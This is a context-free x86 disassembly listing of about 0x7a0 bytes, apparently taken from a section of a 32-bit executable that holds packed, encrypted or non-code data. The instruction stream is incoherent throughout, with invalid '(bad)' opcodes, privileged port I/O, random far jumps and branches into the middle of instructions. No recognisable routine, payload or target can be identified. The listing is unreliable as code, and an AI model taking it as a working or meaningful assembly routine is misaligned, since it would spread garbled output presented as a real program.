  41de91:	(bad)  
  41de92:	jmp    0x41ded5
  41de94:	fist   WORD PTR [esi]
  41de96:	aas    
  41de97:	mov    dh,0xea
  41de99:	push   cs
  41de9a:	inc    eax
  41de9b:	fwait
  41de9c:	and    ebp,DWORD PTR [esi]
  41de9e:	sahf   
  41de9f:	sbb    al,0x6a
  41dea1:	pop    ebp
  41dea2:	cs pop ebx
  41dea4:	push   DWORD PTR [ecx+ebp*4]
  41dea7:	xchg   edx,eax
  41dea8:	cmp    BYTE PTR [ecx],dh
  41deaa:	inc    eax
  41deab:	(bad)  
  41dead:	loop   0x41df2d
  41deaf:	or     ebx,DWORD PTR [edi]
  41deb1:	outs   dx,DWORD PTR ds:[esi]
  41deb2:	pusha  
  41deb3:	pop    ss
  41deb4:	xchg   cx,ax
  41deb6:	ins    BYTE PTR es:[edi],dx
  41deb7:	xlat   BYTE PTR ds:[ebx]
  41deb8:	js     0x41dec4
  41deba:	out    dx,al
  41debb:	cwde   
  41debc:	push   es
  41debd:	mov    cl,0xd2
  41debf:	mov    bl,0x8d
  41dec1:	retf   0x18ea
  41dec4:	rol    DWORD PTR [ebx],0x54
  41dec7:	retf   
  41dec8:	lods   eax,DWORD PTR ds:[esi]
  41dec9:	pop    es
  41deca:	repz ja 0x41df00
  41decd:	sbb    esp,0x14
  41ded0:	aaa    
  41ded1:	jno    0x41deb7
  41ded3:	push   ecx
  41ded4:	(bad)  
  41ded5:	mov    ebp,0x9df2db75
  41deda:	ds pop esi
  41dedc:	out    0x69,eax
  41dede:	sub    al,0x35
  41dee0:	pop    ss
  41dee1:	mov    gs,ebx
  41dee3:	cdq    
  41dee4:	lahf   
  41dee5:	add    edi,esi
  41dee7:	aad    0x10
  41dee9:	repz div BYTE PTR [edi]
  41deec:	das    
  41deed:	fidiv  WORD PTR [edi+0xc]
  41def0:	dec    eax
  41def1:	cmp    ebp,0x238db6db
  41def7:	js     0x41df4d
  41def9:	fs dec eax
  41defb:	dec    edi
  41defc:	(bad)  
  41defd:	mov    WORD PTR [ebp-0x2a],fs
  41df00:	pushf  
  41df01:	ror    DWORD PTR [esi],cl
  41df03:	stos   DWORD PTR es:[edi],eax
  41df04:	xchg   edx,eax
  41df05:	xchg   ebx,eax
  41df06:	adc    ebp,DWORD PTR [ebp-0x34]
  41df09:	loopne 0x41df83
  41df0b:	test   DWORD PTR [edx-0x19bf9c0a],0x84e0ec0f
  41df15:	int    0xac
  41df17:	leave  
  41df18:	sub    DWORD PTR [ecx+0xf],edi
  41df1b:	dec    ebx
  41df1c:	mov    esi,0x26b5ac6b
  41df21:	cs mov ah,0x35
  41df24:	movups xmm3,XMMWORD PTR [ecx+0x1488a274]
  41df2b:	rcl    BYTE PTR [edi-0x49d3b3af],cl
  41df31:	addr16 loopne 0x41deec
  41df34:	clc    
  41df35:	adc    eax,0x89751d44
  41df3a:	jl     0x41df20
  41df3c:	cdq    
  41df3d:	add    BYTE PTR [edx-0x57],al
  41df40:	xor    ah,BYTE PTR [esi-0x221da2f]
  41df46:	es imul edi,eax,0x36
  41df4a:	mov    esi,0xaa80d90b
  41df4f:	sbb    ebp,DWORD PTR [edx+0xa]
  41df52:	sbb    dl,ch
  41df54:	lea    esi,[ebp-0x4ee53972]
  41df5a:	mov    ?,WORD PTR [ebp+0x4479e8f6]
  41df60:	ja     0x41df72
  41df62:	push   ds
  41df63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df64:	cs int 0x8e
  41df67:	xlat   BYTE PTR ds:[ebx]
  41df68:	popa   
  41df69:	rol    DWORD PTR [ecx],0x8e
  41df6c:	das    
  41df6d:	(bad)  
  41df6e:	xlat   BYTE PTR ds:[ebx]
  41df6f:	sub    al,0xc9
  41df71:	stos   BYTE PTR es:[edi],al
  41df72:	popf   
  41df73:	sbb    ecx,DWORD PTR [esi+0x3badd42f]
  41df79:	mov    ecx,0x6a868091
  41df7e:	mov    bl,0x37
  41df80:	mov    bl,0xbc
  41df82:	mov    gs,edx
  41df84:	and    DWORD PTR [edx+0x27],eax
  41df87:	add    BYTE PTR [edx+0x1b],ch
  41df8a:	push   ebp
  41df8b:	mov    esi,0x76bae4bf
  41df90:	es test eax,0xfcb5952c
  41df96:	outs   dx,DWORD PTR ds:[esi]
  41df97:	xor    ebp,0xfa97c192
  41df9d:	rcr    DWORD PTR [ecx+0x31e8d897],1
  41dfa3:	xchg   esi,eax
  41dfa4:	enter  0x79e,0x4e
  41dfa8:	in     eax,dx
  41dfa9:	fldcw  WORD PTR [ebx-0xe]
  41dfac:	daa    
  41dfad:	inc    edx
  41dfae:	xchg   ebp,eax
  41dfaf:	push   ds
  41dfb0:	or     al,0x39
  41dfb2:	ret    0xad21
  41dfb5:	loopne 0x41dfde
  41dfb7:	aad    0x38
  41dfb9:	jecxz  0x41e019
  41dfbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfbc:	loopne 0x41df59
  41dfbe:	pfrcp  mm3,QWORD PTR [edx-0x3311c00d]
  41dfc6:	das    
  41dfc7:	mov    edi,0x1a5e4105
  41dfcc:	sub    dl,bh
  41dfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfcf:	mov    ecx,0xa03e8005
  41dfd4:	daa    
  41dfd5:	mul    bh
  41dfd7:	mov    bh,0xda
  41dfd9:	mov    esi,0xc38bb05d
  41dfde:	mov    ebx,0xe088c41f
  41dfe3:	push   ebx
  41dfe4:	push   ds
  41dfe5:	sub    DWORD PTR [ebx+edx*8+0x5b0016b0],esi
  41dfec:	popf   
  41dfed:	mov    ebx,0xd673b752
  41dff2:	stc    
  41dff3:	sub    BYTE PTR [ebx],bl
  41dff5:	call   0xe7b0:0xb31798f0
  41dffc:	les    eax,FWORD PTR [esi]
  41dffe:	ds stos BYTE PTR es:[edi],al
  41e000:	cmp    eax,0xf21cd1e9
  41e005:	es add eax,0x6d9ee09f
  41e00b:	adc    DWORD PTR [ebx+0x15660b3c],esp
  41e011:	ja     0x41e07f
  41e013:	test   BYTE PTR [edi+0x16],0xaf
  41e017:	test   al,0xe8
  41e019:	jns    0x41e074
  41e01b:	lods   al,BYTE PTR ds:[esi]
  41e01c:	in     eax,dx
  41e01d:	inc    esp
  41e01e:	popa   
  41e01f:	adc    ch,cl
  41e021:	sar    DWORD PTR [eax+0x1e],cl
  41e024:	pusha  
  41e025:	cwde   
  41e026:	cmp    bh,BYTE PTR [edx-0x58f00c27]
  41e02c:	aam    0xf9
  41e02e:	sub    eax,0x33d5e900
  41e033:	pop    ecx
  41e034:	inc    ecx
  41e035:	inc    edi
  41e036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e037:	or     al,0xa1
  41e039:	cmc    
  41e03a:	xchg   esp,eax
  41e03b:	push   esp
  41e03c:	and    ebp,esi
  41e03e:	in     eax,dx
  41e03f:	retf   0xd218
  41e042:	bts    DWORD PTR ds:0xc6694286,esi
  41e049:	stos   DWORD PTR es:[edi],eax
  41e04a:	pop    edx
  41e04b:	sbb    BYTE PTR [bp+0x38a5],dl
  41e050:	mov    edi,es
  41e052:	adc    al,0x9d
  41e054:	lock iret 
  41e056:	and    ch,BYTE PTR [ebx-0x3f6c4254]
  41e05c:	in     al,dx
  41e05d:	mov    ebp,0xa116fa3c
  41e062:	pusha  
  41e063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e064:	xchg   ecx,eax
  41e065:	push   es
  41e066:	xor    eax,0x829ebd00
  41e06b:	das    
  41e06c:	sbb    al,0x15
  41e06e:	inc    ebp
  41e06f:	out    0xbb,al
  41e071:	jecxz  0x41e0c6
  41e073:	jno    0x41e070
  41e075:	mov    ds,ecx
  41e077:	retf   
  41e078:	sbb    eax,DWORD PTR [ecx-0x1e]
  41e07b:	adc    dh,BYTE PTR [ecx-0x10989056]
  41e081:	imul   edi,DWORD PTR [ebx],0x78
  41e084:	(bad)  
  41e085:	int3   
  41e086:	retf   0xc5b6
  41e089:	or     BYTE PTR [edi],0xf7
  41e08c:	mov    dh,0x30
  41e08e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08f:	cld    
  41e090:	shr    BYTE PTR [ecx-0x20],1
  41e093:	nop
  41e094:	not    DWORD PTR [edx]
  41e096:	push   es
  41e097:	add    BYTE PTR [ecx],0x74
  41e09a:	fimul  DWORD PTR [ebx-0x493f2feb]
  41e0a0:	cmp    ebp,DWORD PTR [ebx+0x64]
  41e0a3:	mov    bh,0xff
  41e0a5:	cdq    
  41e0a6:	mov    esi,0xaf14604a
  41e0ab:	jl     0x41e07a
  41e0ad:	dec    eax
  41e0ae:	mov    BYTE PTR [esp+ebx*1-0x5e],al
  41e0b2:	cdq    
  41e0b3:	shr    BYTE PTR [eax+0xa],1
  41e0b6:	add    eax,0xa422c370
  41e0bb:	sub    DWORD PTR [edi+0x5f],ecx
  41e0be:	add    al,0xdf
  41e0c0:	push   esp
  41e0c1:	popa   
  41e0c2:	(bad)  
  41e0c3:	jmp    0x5b20:0x6390d05e
  41e0ca:	xor    DWORD PTR [ebx-0x55d748d2],ebx
  41e0d0:	imul   edi,DWORD PTR [ebp+0x351fb81e],0x67
  41e0d7:	lea    ebx,[ecx-0x5b]
  41e0da:	xchg   esp,eax
  41e0db:	sbb    al,0xba
  41e0dd:	ins    BYTE PTR es:[edi],dx
  41e0de:	outs   dx,BYTE PTR ds:[esi]
  41e0df:	mov    fs,WORD PTR [esi-0x2eba3c27]
  41e0e5:	mov    eax,0xcf63b481
  41e0ea:	aaa    
  41e0eb:	push   esp
  41e0ec:	lock xchg edx,eax
  41e0ee:	dec    eax
  41e0ef:	leave  
  41e0f0:	push   esp
  41e0f1:	push   0x7c
  41e0f3:	gs push esp
  41e0f5:	lahf   
  41e0f6:	and    eax,0x4e3e0f5c
  41e0fb:	push   ds
  41e0fc:	or     bh,BYTE PTR [esi]
  41e0fe:	shl    BYTE PTR [eax+ecx*1],0x69
  41e102:	sub    dh,BYTE PTR [ebp+0x4a4a45d0]
  41e108:	jmp    0x41e0ec
  41e10a:	ja     0x41e0b7
  41e10c:	out    dx,al
  41e10d:	repnz mov ds:0x9129d362,eax
  41e113:	shl    DWORD PTR [edi+0x3b],1
  41e116:	add    dl,dh
  41e118:	cmp    al,0x60
  41e11a:	push   ebp
  41e11b:	xchg   esi,eax
  41e11c:	jno    0x41e0b6
  41e11e:	js     0x41e0ae
  41e120:	xor    ecx,DWORD PTR [esi+0x4e654b38]
  41e126:	add    ch,BYTE PTR [ecx-0x70]
  41e129:	std    
  41e12a:	sub    esp,DWORD PTR [ebx+0x55e3f912]
  41e130:	xor    eax,0x4b952c6b
  41e135:	pusha  
  41e136:	enter  0x8655,0x21
  41e13a:	sti    
  41e13b:	fwait
  41e13c:	push   esp
  41e13d:	pop    esp
  41e13e:	scas   al,BYTE PTR es:[edi]
  41e13f:	std    
  41e140:	loopne 0x41e145
  41e142:	gs in  al,0xb0
  41e145:	jae    0x41e0f7
  41e147:	(bad)  
  41e148:	fsubp  st(3),st
  41e14a:	data16 xor BYTE PTR [edx-0x56ec8e3e],0x88
  41e152:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e153:	nop
  41e154:	mov    ah,0x84
  41e156:	ins    DWORD PTR es:[edi],dx
  41e157:	add    al,0x3c
  41e159:	ret    
  41e15a:	mov    ebx,0x3d2944b4
  41e15f:	aad    0x9d
  41e161:	scas   eax,DWORD PTR es:[edi]
  41e162:	push   ds
  41e163:	out    0x3f,al
  41e165:	mov    dl,0x75
  41e167:	pop    eax
  41e168:	ss cmc 
  41e16a:	ret    
  41e16b:	dec    edi
  41e16c:	jg     0x41e181
  41e16e:	dec    esp
  41e16f:	loopne 0x41e1b4
  41e171:	mov    al,al
  41e173:	jb     0x41e162
  41e175:	stos   DWORD PTR es:[edi],eax
  41e176:	dec    ecx
  41e177:	fimul  WORD PTR [esi+0x55]
  41e17a:	push   edi
  41e17b:	or     al,0x42
  41e17d:	js     0x41e10d
  41e17f:	in     al,dx
  41e180:	sbb    al,0x6e
  41e182:	or     BYTE PTR [edi*2+0x394e6f8c],bh
  41e189:	shl    DWORD PTR [edi],cl
  41e18b:	aaa    
  41e18c:	stos   BYTE PTR es:[edi],al
  41e18d:	addr16 mov ecx,0x28186f95
  41e193:	push   es
  41e194:	(bad)  
  41e195:	ins    BYTE PTR es:[edi],dx
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	ret    0x9aa1
  41e19a:	mov    ebx,0x990f8019
  41e19f:	push   esi
  41e1a0:	call   0x9647:0x19ddc018
  41e1a7:	stos   BYTE PTR es:[edi],al
  41e1a8:	and    cl,BYTE PTR [ebx+0x10777986]
  41e1ae:	stc    
  41e1af:	into   
  41e1b0:	ds popf 
  41e1b2:	cld    
  41e1b3:	adc    ecx,0x3f
  41e1b6:	sbb    BYTE PTR [edx-0x7df7942b],ah
  41e1bc:	add    DWORD PTR [ecx-0x1a1f1cc2],esi
  41e1c2:	mov    dl,0x4b
  41e1c4:	loop   0x41e159
  41e1c6:	pop    edi
  41e1c7:	pusha  
  41e1c8:	mov    eax,0xa4eb4247
  41e1cd:	test   DWORD PTR [ebp-0x49],esp
  41e1d0:	adc    dh,cl
  41e1d2:	inc    esi
  41e1d3:	loope  0x41e1f5
  41e1d5:	pop    ecx
  41e1d6:	icebp  
  41e1d7:	pop    ss
  41e1d8:	jmp    0x41e1b4
  41e1da:	xor    eax,DWORD PTR [edi]
  41e1dc:	fist   WORD PTR [esi-0x292f32e1]
  41e1e2:	cmp    al,dh
  41e1e4:	fldenv [eax+0x5d]
  41e1e7:	dec    eax
  41e1e8:	mov    eax,ds:0x2e092aed
  41e1ed:	or     DWORD PTR [eax+eax*8-0x1f],esp
  41e1f1:	sub    eax,DWORD PTR [edx]
  41e1f3:	cdq    
  41e1f4:	in     al,dx
  41e1f5:	mov    edi,0xa001fcb1
  41e1fa:	out    dx,eax
  41e1fb:	jae    0x41e27b
  41e1fd:	push   cs
  41e1fe:	fld    DWORD PTR [eax-0x59]
  41e201:	rcr    BYTE PTR [ebp-0x5d],cl
  41e204:	mov    ch,ch
  41e206:	imul   edi,esi,0x1a30c586
  41e20c:	lds    edi,FWORD PTR [esi+0x3eedff10]
  41e212:	fnstsw WORD PTR [ecx+eiz*2]
  41e215:	loopne 0x41e1eb
  41e217:	push   esi
  41e218:	outs   dx,DWORD PTR ds:[esi]
  41e219:	push   0x7d66aec2
  41e21e:	pop    eax
  41e21f:	or     ebp,DWORD PTR [ebx-0x60ede001]
  41e225:	xor    cl,cl
  41e227:	cmp    edx,ebx
  41e229:	or     BYTE PTR [edi-0x6c9514e],al
  41e22f:	pop    ds
  41e230:	mov    esi,0xd6c6cf44
  41e235:	shl    ebp,0x7b
  41e238:	dec    esi
  41e239:	jo     0x41e237
  41e23b:	loopne 0x41e1f3
  41e23d:	test   BYTE PTR [ecx-0x27],bl
  41e240:	fwait
  41e241:	mov    ecx,0x8ff263b9
  41e246:	cdq    
  41e247:	ja     0x41e2c7
  41e249:	loope  0x41e208
  41e24b:	arpl   WORD PTR [edi-0x7d17f418],bp
  41e251:	add    dl,bh
  41e253:	jns    0x41e2c0
  41e255:	aaa    
  41e256:	fwait
  41e257:	sub    esp,DWORD PTR [eax]
  41e259:	pushf  
  41e25a:	add    DWORD PTR [esi],eax
  41e25c:	fnstsw WORD PTR [ebp-0x60a6a130]
  41e262:	test   ebx,0xa6f1ccee
  41e268:	test   BYTE PTR [ecx-0x1c960eec],0x8c
  41e26f:	gs push ds
  41e271:	(bad)  
  41e272:	sub    bl,BYTE PTR [edx]
  41e274:	cmp    al,0x41
  41e276:	pushf  
  41e277:	jmp    0xfc107f68
  41e27c:	or     bl,BYTE PTR [edx+eiz*8+0x6f55e68]
  41e283:	xchg   esi,eax
  41e284:	aam    0x25
  41e286:	fisubr WORD PTR [esi-0x5b3dbbb1]
  41e28c:	mov    ah,0x96
  41e28e:	and    al,0x28
  41e290:	stos   BYTE PTR es:[edi],al
  41e291:	and    ch,ch
  41e293:	adc    BYTE PTR es:[ecx+0x19],0xdc
  41e298:	leave  
  41e299:	cmp    al,0xa3
  41e29b:	in     eax,0xb0
  41e29d:	add    eax,0x6717739
  41e2a2:	xchg   BYTE PTR fs:[esi+0x1b],cl
  41e2a6:	es add al,0x46
  41e2a9:	pop    edi
  41e2aa:	jl     0x41e22d
  41e2ac:	dec    ebp
  41e2ad:	jmp    0x41d10306
  41e2b2:	mov    ds:0xe9dcdc8c,eax
  41e2b7:	mov    edi,0xf9ae37cd
  41e2bc:	xor    edi,DWORD PTR [ebx-0x5b19a3af]
  41e2c2:	mov    bl,0x1e
  41e2c4:	push   ss
  41e2c5:	xchg   ebx,eax
  41e2c6:	and    al,0x69
  41e2c8:	push   ecx
  41e2c9:	je     0x41e2b9
  41e2cb:	ss pop esp
  41e2cd:	sub    al,0x74
  41e2cf:	call   FWORD PTR ds:0xd49d75de
  41e2d5:	nop
  41e2d6:	pop    ds
  41e2d7:	add    edi,0x937c209e
  41e2dd:	test   ch,ch
  41e2df:	or     al,0xcc
  41e2e1:	cwde   
  41e2e2:	loope  0x41e321
  41e2e4:	or     esp,esp
  41e2e6:	push   edx
  41e2e7:	in     eax,dx
  41e2e8:	lds    ecx,FWORD PTR [ecx+0x3a423637]
  41e2ee:	sub    ch,BYTE PTR [ebx-0x6738be5f]
  41e2f4:	sahf   
  41e2f5:	test   al,0xe7
  41e2f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2f9:	lods   eax,DWORD PTR ds:[esi]
  41e2fa:	adc    DWORD PTR [edx],edi
  41e2fc:	mov    ds:0x5ebb383e,al
  41e301:	aam    0x7a
  41e303:	xchg   edx,eax
  41e304:	(bad)  
  41e305:	aas    
  41e306:	sbb    BYTE PTR [ebx],0xa5
  41e309:	mov    edi,0x4fe19b16
  41e30e:	pop    ss
  41e30f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41e311:	mov    bl,0x5f
  41e313:	iret   
  41e314:	fidiv  WORD PTR [ebx+0x1f8e3b01]
  41e31a:	fnsave [eax+0x62f2aead]
  41e320:	mov    ds:0xdb198e78,eax
  41e325:	mov    ah,0xae
  41e327:	jbe    0x41e370
  41e329:	rol    DWORD PTR [ebx+0x30],0x76
  41e32d:	cmp    edx,DWORD PTR [ecx]
  41e32f:	leave  
  41e330:	cmc    
  41e331:	or     eax,0x227fa176
  41e336:	cmp    esp,DWORD PTR [esi+0x32]
  41e339:	adc    DWORD PTR [ebx],ecx
  41e33b:	jl     0xe3bad43b
  41e341:	lea    ebp,[edx+0xb]
  41e344:	adc    DWORD PTR [eax],0x21913dc4
  41e34a:	stos   DWORD PTR es:[edi],eax
  41e34b:	mov    dh,0xd6
  41e34d:	mov    esi,0xf56a3b0e
  41e352:	sbb    eax,0xbd4931c3
  41e357:	mov    ah,0xa2
  41e359:	call   0x4cf03668
  41e35e:	adc    eax,0xbc5f0c24
  41e363:	jmp    0xedb78e
  41e368:	jp     0x41e35e
  41e36a:	sbb    bl,BYTE PTR [ecx+eax*2]
  41e36d:	jmp    ebx
  41e36f:	test   al,0x9c
  41e371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e372:	pop    ebp
  41e373:	sar    DWORD PTR [ecx+eiz*1+0x651b91b7],1
  41e37a:	pusha  
  41e37b:	mov    ds:0xda16560f,al
  41e380:	add    dl,BYTE PTR [esi+0x6f]
  41e383:	or     al,0x36
  41e385:	and    al,0x68
  41e387:	adc    DWORD PTR [edi+0x2c],ebx
  41e38a:	cmp    ecx,DWORD PTR [esi]
  41e38c:	xor    eax,0xf28aa78e
  41e391:	mov    esi,0x931f5ac0
  41e396:	sub    eax,0x7414158d
  41e39b:	push   ss
  41e39c:	sbb    ah,BYTE PTR [edi+0xbd469cc]
  41e3a2:	or     DWORD PTR gs:[edi],ebp
  41e3a5:	pop    edx
  41e3a6:	cwde   
  41e3a7:	push   edi
  41e3a8:	adc    cl,ch
  41e3aa:	inc    edi
  41e3ab:	sub    DWORD PTR [ebp+0x14],edi
  41e3ae:	xor    al,0xaa
  41e3b0:	mov    dh,0xbb
  41e3b2:	jge    0x41e3b9
  41e3b4:	inc    eax
  41e3b5:	or     bl,BYTE PTR [edx+0x7508a1a4]
  41e3bb:	xchg   edx,eax
  41e3bc:	mov    edx,0x15557825
  41e3c1:	sbb    al,0xa6
  41e3c3:	or     BYTE PTR [esp+esi*1],dl
  41e3c6:	pop    eax
  41e3c7:	push   0x5e
  41e3c9:	hlt    
  41e3ca:	loope  0x41e41c
  41e3cc:	nop
  41e3cd:	sub    esp,edx
  41e3cf:	cmp    cl,BYTE PTR [ecx+0x1a464ede]
  41e3d5:	xchg   ebx,edx
  41e3d7:	push   ebp
  41e3d8:	pop    esi
  41e3d9:	ins    DWORD PTR es:[edi],dx
  41e3da:	bound  eax,QWORD PTR ds:0xc32ab2f8
  41e3e0:	and    edi,DWORD PTR [esi]
  41e3e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e3:	pop    eax
  41e3e4:	arpl   WORD PTR [edx+edi*2],bp
  41e3e7:	or     DWORD PTR [ebx-0x4a94a2ad],ecx
  41e3ed:	addr16 push ecx
  41e3ef:	xchg   esi,eax
  41e3f0:	out    dx,al
  41e3f1:	jg     0x41e406
  41e3f3:	and    eax,0x363bc22
  41e3f8:	lock add bl,BYTE PTR ds:0x2c93608f
  41e3ff:	popf   
  41e400:	add    DWORD PTR [edx+ecx*4-0x79],edx
  41e404:	adc    DWORD PTR [ebp+ecx*8-0x5a885727],ecx
  41e40b:	sbb    eax,0xd4c1be01
  41e410:	mov    al,ds:0x83cbd81a
  41e415:	jae    0x41e39b
  41e417:	ret    0xef7
  41e41a:	(bad)  
  41e41c:	in     al,0xfe
  41e41e:	fdiv   DWORD PTR [ebx*2+0xd85343e]
  41e425:	ins    DWORD PTR es:[edi],dx
  41e426:	push   ebx
  41e427:	enter  0xbdb4,0x67
  41e42b:	jecxz  0x41e3b6
  41e42d:	int3   
  41e42e:	xor    al,ch
  41e430:	mov    WORD PTR ss:[ecx],ss
  41e433:	cld    
  41e434:	fldenv [ebp-0x4a384b25]
  41e43a:	dec    edx
  41e43b:	xchg   DWORD PTR [ecx+edi*8],esi
  41e43e:	mov    dl,0x61
  41e440:	aad    0xd7
  41e442:	pop    edx
  41e443:	xor    ebp,DWORD PTR [edi+ebx*8-0x6b]
  41e447:	test   al,0xb2
  41e449:	retf   
  41e44a:	mov    edi,0x372c2ea7
  41e44f:	aaa    
  41e450:	dec    esp
  41e451:	add    ecx,DWORD PTR [edx]
  41e453:	or     eax,0xf6d48144
  41e458:	inc    eax
  41e459:	cli    
  41e45a:	add    DWORD PTR [edi],ebx
  41e45c:	add    esp,DWORD PTR [ebx+0x48]
  41e45f:	inc    edx
  41e460:	and    BYTE PTR ds:[ebx+0x4a8379bc],dl
  41e467:	ins    BYTE PTR es:[edi],dx
  41e468:	ss or  eax,0x112ad58c
  41e46e:	sub    edi,esp
  41e470:	sbb    esi,DWORD PTR [esi-0x12]
  41e473:	sahf   
  41e474:	sbb    eax,0xa5612571
  41e479:	cwde   
  41e47a:	ins    DWORD PTR es:[edi],dx
  41e47b:	data16 fld DWORD PTR [edx+0x6eae6ea]
  41e482:	pop    esp
  41e483:	add    dh,BYTE PTR [edx-0x37f28ff7]
  41e489:	ror    DWORD PTR [edi],0xe1
  41e48c:	xchg   ebp,eax
  41e48d:	sub    cl,ch
  41e48f:	retf   
  41e490:	pop    es
  41e491:	pop    ebp
  41e492:	aam    0xe0
  41e494:	jp     0x41e4d3
  41e496:	push   edx
  41e497:	addr16 jne 0x41e463
  41e49a:	mov    ebx,0xcd0eaa17
  41e49f:	jmp    0xc6eb:0x5dcd122a
  41e4a6:	jae    0x41e4a7
  41e4a8:	adc    al,dh
  41e4aa:	mov    ah,0xc1
  41e4ac:	into   
  41e4ad:	push   0xad7d5b4d
  41e4b2:	inc    DWORD PTR [ecx+0x9aea393]
  41e4b8:	xchg   BYTE PTR [ecx-0x347a7e97],cl
  41e4be:	sbb    bl,BYTE PTR [ecx-0x35]
  41e4c1:	outs   dx,BYTE PTR ds:[esi]
  41e4c2:	mov    ah,BYTE PTR [ecx+0x48560174]
  41e4c8:	xor    al,0x7f
  41e4ca:	je     0x41e4fd
  41e4cc:	aas    
  41e4cd:	mov    ecx,0x43c74af
  41e4d2:	sbb    DWORD PTR [esi],edx
  41e4d4:	fimul  DWORD PTR [ecx+0xdd693db]
  41e4da:	xor    al,0xc2
  41e4dc:	xor    BYTE PTR ds:0x248a73e3,bh
  41e4e2:	jmp    0x4a190800
  41e4e7:	aaa    
  41e4e8:	rol    DWORD PTR ds:0xdcb6f7ae,cl
  41e4ee:	sub    eax,0xfeecfc8c
  41e4f3:	add    eax,0x3097222c
  41e4f8:	retf   
  41e4f9:	push   ebp
  41e4fa:	push   es
  41e4fb:	inc    edx
  41e4fc:	inc    ebp
  41e4fd:	stc    
  41e4fe:	and    dl,dl
  41e500:	jle    0x41e4bb
  41e502:	or     esp,DWORD PTR [ebx-0x20]
  41e505:	add    al,0xcd
  41e507:	xor    DWORD PTR [eax],ebx
  41e509:	dec    DWORD PTR [eax+ebx*4+0x4f]
  41e50d:	pop    edi
  41e50e:	(bad)  
  41e50f:	frstor [esi+0xff9d2e6]
  41e515:	sbb    ah,BYTE PTR [edi]
  41e517:	int3   
  41e518:	mov    ch,0x53
  41e51a:	sub    esi,DWORD PTR [esi+ebx*8]
  41e51d:	loope  0x41e53e
  41e51f:	pop    es
  41e520:	mov    bh,0x5b
  41e522:	lods   eax,DWORD PTR ds:[esi]
  41e523:	std    
  41e524:	pop    ecx
  41e525:	in     al,0xb4
  41e527:	mov    ah,0xa1
  41e529:	push   0xf
  41e52b:	xchg   esp,eax
  41e52c:	mov    eax,ds:0x8290068b
  41e531:	arpl   WORD PTR [esi-0x43],di
  41e534:	mov    al,0x39
  41e536:	add    al,0xc9
  41e538:	push   cs
  41e539:	pushf  
  41e53a:	jge    0x41e515
  41e53c:	jle    0x41e581
  41e53e:	dec    edx
  41e53f:	(bad)  
  41e540:	mov    ebp,gs
  41e542:	inc    esp
  41e543:	scas   al,BYTE PTR es:[edi]
  41e544:	sbb    dh,BYTE PTR [eax]
  41e546:	dec    esi
  41e547:	sub    dh,BYTE PTR [edi+edi*8-0x6e]
  41e54b:	and    edx,edx
  41e54d:	mov    DWORD PTR [ebp+0x7a064cf5],esi
  41e553:	jp     0x41e584
  41e555:	xor    DWORD PTR [esi],edx
  41e557:	iret   
  41e558:	sbb    BYTE PTR [ecx],dh
  41e55a:	test   BYTE PTR [eax],dl
  41e55c:	call   0x709392c2
  41e561:	mov    esp,0x3c4f38ee
  41e566:	push   ecx
  41e567:	dec    ebx
  41e568:	aam    0x19
  41e56a:	cmp    al,0x62
  41e56c:	cmp    BYTE PTR [edi-0x41],bh
  41e56f:	test   eax,0xf9b06aa1
  41e574:	fst    QWORD PTR [ebp+0x55]
  41e577:	add    ebp,edi
  41e579:	ficomp DWORD PTR [eax-0x24]
  41e57c:	xor    al,0x32
  41e57e:	lock jmp 0x41e503
  41e581:	fwait
  41e582:	out    0x23,al
  41e584:	mov    eax,ds:0x480b83b
  41e589:	push   esi
  41e58a:	sub    dl,0xf7
  41e58d:	xchg   esi,eax
  41e58e:	mov    esi,0x35b5f4d
  41e593:	les    ebp,FWORD PTR [ecx]
  41e595:	and    eax,0xcd972f1
  41e59a:	cs push ecx
  41e59c:	cmp    ebp,esi
  41e59e:	adc    al,0x8
  41e5a0:	sub    eax,0x82ed0372
  41e5a5:	gs mov al,0xaf
  41e5a8:	out    0x96,eax
  41e5aa:	push   eax
  41e5ab:	ds jo  0x41e5b2
  41e5ae:	rcr    DWORD PTR es:[ecx+0x2ea885fe],cl
  41e5b5:	jnp    0x41e622
  41e5b7:	fld    TBYTE PTR [eax-0x4a9fa4d8]
  41e5bd:	jno    0x41e56a
  41e5bf:	jno    0x41e5c6
  41e5c1:	cmp    BYTE PTR [ebx-0x70444644],ch
  41e5c7:	ins    BYTE PTR es:[edi],dx
  41e5c8:	inc    eax
  41e5c9:	mov    esi,0xb5a0c19b
  41e5ce:	push   ss
  41e5cf:	fisttp QWORD PTR ds:0x3fa0c46f
  41e5d5:	inc    ax
  41e5d7:	test   al,0xeb
  41e5d9:	inc    edx
  41e5da:	es jmp 0x76ae:0xf493b322
  41e5e2:	mov    eax,0x7d55b80a
  41e5e7:	iret   
  41e5e8:	push   0x9f0934ac
  41e5ed:	js     0x41e5c5
  41e5ef:	fnstsw WORD PTR [ebx-0x44521550]
  41e5f5:	sub    BYTE PTR [ecx],ah
  41e5f7:	pop    esi
  41e5f8:	outs   dx,BYTE PTR ds:[esi]
  41e5f9:	test   eax,0xaa8b4524
  41e5fe:	or     al,ah
  41e600:	popa   
  41e601:	inc    esi
  41e602:	repnz dec edi
  41e604:	cmp    eax,0xc6353b1
  41e609:	xchg   edx,eax
  41e60a:	lock out dx,eax
  41e60c:	jl     0x41e604
  41e60e:	jmp    0x41e616
  41e610:	sub    eax,DWORD PTR ss:[edx-0x5a7ea39d]
  41e617:	aad    0xd8
  41e619:	add    DWORD PTR fs:[edx-0x1c],edi
  41e61d:	xlat   BYTE PTR ds:[ebx]
  41e61e:	scas   al,BYTE PTR es:[edi]
  41e61f:	and    al,0xd5
  41e621:	outs   dx,BYTE PTR ds:[esi]
  41e622:	xor    BYTE PTR [eax+ebx*8],bh
  41e625:	out    0x63,eax
  41e627:	push   ss
  41e628:	mov    al,ds:0x89401620
  41e62d:	sub    eax,0x91cb8b57
  41e632:	clc    
  41e633:	ins    BYTE PTR es:[edi],dx
